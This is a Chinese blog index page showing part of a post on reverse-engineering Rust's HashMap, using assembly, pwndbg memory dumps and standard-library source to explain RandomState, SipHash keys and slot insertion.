<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"hornos3.github.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="CoLin&#39;s BLOG">
<meta property="og:url" content="http://hornos3.github.com/page/3/index.html">
<meta property="og:site_name" content="CoLin&#39;s BLOG">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="CoLin">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://hornos3.github.com/page/3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>CoLin's BLOG</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">CoLin's BLOG</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/11/28/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/28/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-7/" class="post-title-link" itemprop="url">Rust逆向学习 (7)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-11-28 20:59:52" itemprop="dateCreated datePublished" datetime="2023-11-28T20:59:52+08:00">2023-11-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-12-13 23:50:53" itemprop="dateModified" datetime="2023-12-13T23:50:53+08:00">2023-12-13</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Rust%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">Rust逆向系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>17k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>15 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="reverse-for-hashmap"><a class="markdownIt-Anchor" href="#reverse-for-hashmap"></a> Reverse for HashMap</h1>
<p>HashMap是各个语言常用的一种数据结构，在每个语言中的实现都有或多或少的差别，相信学过数据结构的都知道HashMap在数据量较大时具有很小的时间复杂度。下面我们将分析在Rust中，HashMap在内存中的表示方式。</p>
<h2 id="new-insert-get"><a class="markdownIt-Anchor" href="#new-insert-get"></a> <code>new</code> / <code>insert</code> / <code>get</code></h2>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::collections::HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">map</span>: HashMap&lt;<span class="type">u64</span>, <span class="type">u64</span>&gt; = HashMap::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    map.<span class="title function_ invoke__">insert</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, map.<span class="title function_ invoke__">get</span>(&amp;<span class="number">1u64</span>).<span class="title function_ invoke__">unwrap</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上面的代码为例。我们分段看一下对应的汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">    sub     rsp, 200</span><br><span class="line">    mov     rax, qword ptr [rip + std::collections::hash::map::HashMap&lt;K,V&gt;::new@GOTPCREL]</span><br><span class="line">    lea     rdi, [rsp + 48]</span><br><span class="line">    mov     qword ptr [rsp + 40], rdi</span><br><span class="line">    call    rax</span><br><span class="line">    mov     rdi, qword ptr [rsp + 40]</span><br><span class="line">    mov     rax, qword ptr [rip + std::collections::hash::map::HashMap&lt;K,V,S&gt;::insert@GOTPCREL]</span><br><span class="line">    mov     esi, 1</span><br><span class="line">    mov     edx, 2</span><br><span class="line">    call    rax</span><br><span class="line">    jmp     .LBB157_3</span><br></pre></td></tr></table></figure>
<p>上面的代码包含了<code>new</code>和<code>insert</code>两个操作，通过调试发现，<code>new</code>方法与字符串、可变数组的<code>new</code>类似，都是传入要初始化的栈指针。在初始化完成之后，这部分栈的数据如下所示，貌似看不出来什么特殊的地方。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x7fffffffd910</span><br><span class="line">00:0000│ rax rdi 0x7fffffffd910 —▸ 0x5555555a62d0 ◂— 0xffffffffffffffff</span><br><span class="line">01:0008│         0x7fffffffd918 ◂— 0x0</span><br><span class="line">... ↓            2 skipped</span><br><span class="line">04:0020│         0x7fffffffd930 ◂— 0x419fa2b4be855595</span><br><span class="line">05:0028│         0x7fffffffd938 ◂— 0x944210c733652a9b</span><br></pre></td></tr></table></figure>
<p>往下是插入方法的调用，参数类型也很明显，第一个为HashMap栈指针，第二个是Key，第三个是Value。我们要重点看一下调用后HashMap的内存结构长啥样。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x7fffffffd910</span><br><span class="line">00:0000│  0x7fffffffd910 —▸ 0x5555555bebe0 ◂— 0xffffffffff45ffff</span><br><span class="line">01:0008│  0x7fffffffd918 ◂— 0x3</span><br><span class="line">02:0010│  0x7fffffffd920 ◂— 0x2</span><br><span class="line">03:0018│  0x7fffffffd928 ◂— 0x1</span><br><span class="line">04:0020│  0x7fffffffd930 ◂— 0x419fa2b4be855595</span><br><span class="line">05:0028│  0x7fffffffd938 ◂— 0x944210c733652a9b</span><br><span class="line"></span><br><span class="line">pwndbg&gt; tele 0x5555555beb90</span><br><span class="line">00:0000│     0x5555555beb90 ◂— 0x0</span><br><span class="line">01:0008│     0x5555555beb98 ◂— 0x61 /* &#x27;a&#x27; */</span><br><span class="line">02:0010│ r9  0x5555555beba0 ◂— 0x0</span><br><span class="line">03:0018│     0x5555555beba8 ◂— 0x0</span><br><span class="line">04:0020│ rcx 0x5555555bebb0 ◂— 0x1</span><br><span class="line">05:0028│     0x5555555bebb8 ◂— 0x2</span><br><span class="line">06:0030│     0x5555555bebc0 ◂— 0x0</span><br><span class="line">07:0038│     0x5555555bebc8 ◂— 0x0</span><br><span class="line">pwndbg&gt; </span><br><span class="line">08:0040│     0x5555555bebd0 ◂— 0x0</span><br><span class="line">09:0048│     0x5555555bebd8 ◂— 0x0</span><br><span class="line">0a:0050│ rdi 0x5555555bebe0 ◂— 0xffffffffff45ffff</span><br><span class="line">0b:0058│     0x5555555bebe8 ◂— 0xffffffffffffffff</span><br><span class="line">0c:0060│     0x5555555bebf0 ◂— 0xff45ffff</span><br><span class="line">0d:0068│     0x5555555bebf8 ◂— 0x20411</span><br><span class="line">0e:0070│     0x5555555bec00 ◂— 0x0</span><br><span class="line">0f:0078│     0x5555555bec08 ◂— 0x0</span><br></pre></td></tr></table></figure>
<p>可以看到，0x5555555beb90应该就是与HashMap相关的数据结构，下面的0x20411是top chunk的大小，后面的内容不属于这个chunk。值得注意的是，这个chunk中确实保存了我们插入的数据，后面还有一些由0xFF组成的未知数据结构。这样看来，单插入一个数据看不出来它的具体实现方式，因此这里尝试多插入一些结构，看看内存的变化。</p>
<p>不看不知道，一看发现，其中的玄机还挺大。在HashMap的栈对象内存空间中，我们在最后可以看到有一个被像是随机数一类的数据占用的0x10大小的内存空间，从IDA反编译可以得知，这是<code>std::collection::hash_map::RandomState</code>实例。这又是一个什么东西呢？</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">RandomState</span> &#123;</span><br><span class="line">    k0: <span class="type">u64</span>,</span><br><span class="line">    k1: <span class="type">u64</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">RandomState</span> &#123;</span><br><span class="line">    <span class="meta">#[inline]</span></span><br><span class="line">    <span class="meta">#[allow(deprecated)]</span></span><br><span class="line">    <span class="meta">#[must_use]</span></span><br><span class="line">    <span class="meta">#[stable(feature = <span class="string">&quot;hashmap_build_hasher&quot;</span>, since = <span class="string">&quot;1.7.0&quot;</span>)]</span></span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">new</span>() <span class="punctuation">-&gt;</span> RandomState &#123;</span><br><span class="line">        thread_local!(<span class="keyword">static</span> KEYS: Cell&lt;(<span class="type">u64</span>, <span class="type">u64</span>)&gt; = &#123;</span><br><span class="line">            Cell::<span class="title function_ invoke__">new</span>(sys::<span class="title function_ invoke__">hashmap_random_keys</span>())</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        KEYS.<span class="title function_ invoke__">with</span>(|keys| &#123;</span><br><span class="line">            <span class="keyword">let</span> (k0, k1) = keys.<span class="title function_ invoke__">get</span>();</span><br><span class="line">            keys.<span class="title function_ invoke__">set</span>((k0.<span class="title function_ invoke__">wrapping_add</span>(<span class="number">1</span>), k1));</span><br><span class="line">            RandomState &#123; k0, k1 &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从上面的Rust内核部分源码可以看到，这里保存的确实是两个随机数，经过测试发现，两个随机数的值每一次执行都不一样。</p>
<p>那么，HashMap为什么需要这样一个结构呢？继续往下看源码：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[stable(since = <span class="string">&quot;1.7.0&quot;</span>, feature = <span class="string">&quot;build_hasher&quot;</span>)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">trait</span> <span class="title class_">BuildHasher</span> &#123;</span><br><span class="line">    <span class="meta">#[stable(since = <span class="string">&quot;1.7.0&quot;</span>, feature = <span class="string">&quot;build_hasher&quot;</span>)]</span></span><br><span class="line">    <span class="keyword">type</span> <span class="title class_">Hasher</span>: Hasher;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#[stable(since = <span class="string">&quot;1.7.0&quot;</span>, feature = <span class="string">&quot;build_hasher&quot;</span>)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">build_hasher</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="keyword">Self</span>::Hasher;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#[stable(feature = <span class="string">&quot;build_hasher_simple_hash_one&quot;</span>, since = <span class="string">&quot;1.71.0&quot;</span>)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">hash_one</span>&lt;T: Hash&gt;(&amp;<span class="keyword">self</span>, x: T) <span class="punctuation">-&gt;</span> <span class="type">u64</span></span><br><span class="line">    <span class="keyword">where</span></span><br><span class="line">        <span class="keyword">Self</span>: <span class="built_in">Sized</span>,</span><br><span class="line">        <span class="keyword">Self</span>::Hasher: Hasher,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">hasher</span> = <span class="keyword">self</span>.<span class="title function_ invoke__">build_hasher</span>();</span><br><span class="line">        x.<span class="title function_ invoke__">hash</span>(&amp;<span class="keyword">mut</span> hasher);</span><br><span class="line">        hasher.<span class="title function_ invoke__">finish</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[stable(feature = <span class="string">&quot;hashmap_build_hasher&quot;</span>, since = <span class="string">&quot;1.7.0&quot;</span>)]</span></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">BuildHasher</span> <span class="keyword">for</span> <span class="title class_">RandomState</span> &#123;</span><br><span class="line">    <span class="keyword">type</span> <span class="title class_">Hasher</span> = DefaultHasher;</span><br><span class="line">    <span class="meta">#[inline]</span></span><br><span class="line">    <span class="meta">#[allow(deprecated)]</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">build_hasher</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> DefaultHasher &#123;</span><br><span class="line">        <span class="title function_ invoke__">DefaultHasher</span>(SipHasher13::<span class="title function_ invoke__">new_with_keys</span>(<span class="keyword">self</span>.k0, <span class="keyword">self</span>.k1))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从<code>RandomState</code>对<code>BuildHasher</code>这个Trait进行impl的情况来看，<code>HashMap</code>使用的是<code>SipHasher13</code>这种Hash算法。这种算法多用于短消息的哈希，是一个伪随机函数族，可作为消息认证的MAC函数使用，具有安全、快速、简洁等特点。具体的算法参见<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43936250/article/details/123736554">传送门</a>。HashMap在每一次<code>insert</code>与<code>get</code>的时候都会使用这个Hash函数进行计算。</p>
<p>好，现在我们知道HashMap使用什么哈希函数进行计算了，并且通过上面的分析也能够得出下面的结论：<strong>在一个Rust进程中，即使是泛型类型完全相同的两个HashMap结构，对于同一个Key所计算出的Hash值也几乎是不可能相同的，因为所使用的SipHasher算法的两个key值是随机生成的，对于不同的key值，计算出来的Hash值也不同。</strong></p>
<p>分析出使用的Hash函数后，我们可以开始解决其他的问题了。第一：这些Hash值在什么地方保存？第二：之前在堆中看到的大部分是0xFF的那一堆数据到底有什么用？</p>
<p>首先解决第一个问题。在调试中通过检查内存情况发现，这些Hash值没有保存在栈或堆中。没有保存在栈好理解，毕竟一个HashMap可能有很多个Hash值，全保存在栈里很可能爆栈的。但是堆空间也没有找到就很有意思了。从IDA反汇编的结果来看，在<code>insert</code>和<code>get</code>内部还调用了其他的方法。在<code>insert</code>中：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">insert</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>, k: K, v: V) <span class="punctuation">-&gt;</span> <span class="type">Option</span>&lt;V&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">hash</span> = make_hash::&lt;K, S&gt;(&amp;<span class="keyword">self</span>.hash_builder, &amp;k);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">hasher</span> = make_hasher::&lt;_, V, S&gt;(&amp;<span class="keyword">self</span>.hash_builder);</span><br><span class="line">    <span class="keyword">match</span> <span class="keyword">self</span></span><br><span class="line">        .table</span><br><span class="line">        .<span class="title function_ invoke__">find_or_find_insert_slot</span>(hash, <span class="title function_ invoke__">equivalent_key</span>(&amp;k), hasher)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(bucket) =&gt; <span class="title function_ invoke__">Some</span>(mem::<span class="title function_ invoke__">replace</span>(<span class="keyword">unsafe</span> &#123; &amp;<span class="keyword">mut</span> bucket.<span class="title function_ invoke__">as_mut</span>().<span class="number">1</span> &#125;, v)),</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(slot) =&gt; &#123;</span><br><span class="line">            <span class="keyword">unsafe</span> &#123;</span><br><span class="line">                <span class="keyword">self</span>.table.<span class="title function_ invoke__">insert_in_slot</span>(hash, slot, (k, v));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="literal">None</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，这里使用hash值（不可变变量<code>hash</code>）的关键方法有<code>find_or_find_insert_slot</code>和<code>insert_in_slot</code>这两个。整个<code>insert</code>方法的逻辑和Rust中对于HashMap的插入操作逻辑相同——当Key存在时，使用新的Value替换旧的Value；当Key不存在时，将Key插入并添加Value。在上面的<code>insert</code>内核方法中，k即为新的Key，v即为新的Value。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[inline]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">find_or_find_insert_slot</span>(</span><br><span class="line">    &amp;<span class="keyword">mut</span> <span class="keyword">self</span>,</span><br><span class="line">    hash: <span class="type">u64</span>,</span><br><span class="line">    <span class="keyword">mut</span> eq: <span class="keyword">impl</span> <span class="title class_">FnMut</span>(&amp;T) <span class="punctuation">-&gt;</span> <span class="type">bool</span>,</span><br><span class="line">    hasher: <span class="keyword">impl</span> <span class="title class_">Fn</span>(&amp;T) <span class="punctuation">-&gt;</span> <span class="type">u64</span>,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;Bucket&lt;T&gt;, InsertSlot&gt; &#123;</span><br><span class="line">    <span class="keyword">self</span>.<span class="title function_ invoke__">reserve</span>(<span class="number">1</span>, hasher);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsafe</span> &#123;</span><br><span class="line">        <span class="keyword">match</span> <span class="keyword">self</span></span><br><span class="line">            .table</span><br><span class="line">            .<span class="title function_ invoke__">find_or_find_insert_slot_inner</span>(hash, &amp;<span class="keyword">mut</span> |index| <span class="title function_ invoke__">eq</span>(<span class="keyword">self</span>.<span class="title function_ invoke__">bucket</span>(index).<span class="title function_ invoke__">as_ref</span>()))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// SAFETY: See explanation above.</span></span><br><span class="line">            <span class="title function_ invoke__">Ok</span>(index) =&gt; <span class="title function_ invoke__">Ok</span>(<span class="keyword">self</span>.<span class="title function_ invoke__">bucket</span>(index)),</span><br><span class="line">            <span class="title function_ invoke__">Err</span>(slot) =&gt; <span class="title function_ invoke__">Err</span>(slot),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[inline]</span></span><br><span class="line"><span class="keyword">unsafe</span> <span class="keyword">fn</span> <span class="title function_">find_or_find_insert_slot_inner</span>(</span><br><span class="line">    &amp;<span class="keyword">self</span>,</span><br><span class="line">    hash: <span class="type">u64</span>,</span><br><span class="line">    eq: &amp;<span class="keyword">mut</span> <span class="keyword">dyn</span> <span class="title function_ invoke__">FnMut</span>(<span class="type">usize</span>) <span class="punctuation">-&gt;</span> <span class="type">bool</span>,</span><br><span class="line">) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;<span class="type">usize</span>, InsertSlot&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">insert_slot</span> = <span class="literal">None</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">h2_hash</span> = <span class="title function_ invoke__">h2</span>(hash);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">probe_seq</span> = <span class="keyword">self</span>.<span class="title function_ invoke__">probe_seq</span>(hash);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">group</span> = <span class="keyword">unsafe</span> &#123; Group::<span class="title function_ invoke__">load</span>(<span class="keyword">self</span>.<span class="title function_ invoke__">ctrl</span>(probe_seq.pos)) &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> <span class="variable">bit</span> <span class="keyword">in</span> group.<span class="title function_ invoke__">match_byte</span>(h2_hash) &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">index</span> = (probe_seq.pos + bit) &amp; <span class="keyword">self</span>.bucket_mask;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="title function_ invoke__">likely</span>(<span class="title function_ invoke__">eq</span>(index)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">Ok</span>(index);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">likely</span>(insert_slot.<span class="title function_ invoke__">is_none</span>()) &#123;</span><br><span class="line">            insert_slot = <span class="keyword">self</span>.<span class="title function_ invoke__">find_insert_slot_in_group</span>(&amp;group, &amp;probe_seq);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">likely</span>(group.<span class="title function_ invoke__">match_empty</span>().<span class="title function_ invoke__">any_bit_set</span>()) &#123;</span><br><span class="line">            <span class="keyword">unsafe</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">Err</span>(<span class="keyword">self</span>.<span class="title function_ invoke__">fix_insert_slot</span>(insert_slot.<span class="title function_ invoke__">unwrap_unchecked</span>()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        probe_seq.<span class="title function_ invoke__">move_next</span>(<span class="keyword">self</span>.bucket_mask);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意到了吗？上面的unsafe方法<code>find_or_find_insert_slot_inner</code>中有一个<code>h2</code>方法：</p>
